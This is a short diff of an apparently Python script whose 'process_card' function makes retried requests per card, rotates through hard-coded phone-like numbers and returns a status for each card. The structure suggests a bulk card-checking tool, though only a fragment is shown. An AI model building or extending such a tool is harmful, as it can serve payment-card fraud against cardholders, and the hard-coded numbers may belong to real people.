@@ -96,7 +96,7 @@ async def process_card(card: str) -> str:
 
             #============[Requests 1]============#
             numeros_disponibles = [
-                "5635116853", "5635161652", "5635117040", "5635117578", "5635119868", "5635120199"
+                "5642755407", "5635121149", "5635121165", "5586396881", "5642380032", "5642378421"
             ]
             elegido = random.choice(numeros_disponibles)
             print(elegido)
@@ -287,4 +287,5 @@ async def process_card(card: str) -> str:
             print(e)
             retry_count += 1
     else:
+
         return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
